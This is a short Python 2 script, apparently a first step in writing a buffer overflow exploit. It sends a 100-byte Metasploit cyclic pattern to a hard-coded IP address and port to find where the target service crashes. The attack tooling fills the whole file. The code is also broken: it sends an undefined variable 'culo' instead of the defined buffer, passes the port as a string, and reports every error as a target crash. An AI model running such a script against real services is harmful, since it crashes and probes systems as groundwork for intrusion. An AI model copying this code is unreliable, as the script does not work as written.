#!/usr/bin/python

import socket, sys

ip = "192.168.15.177" # Change me
port = "31337" # Change me
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" # Change me. You can get this with: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

try:
    print "\033[;36m"+"[***] Sending buffer [***]"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(culo + "\r\n")
    s.recv(1024)
   
except:
    print "\033[;36m"+"[¡¡¡]The program has surely crashed [!!!]"
    sys.exit(0)

finally:
    s.close()
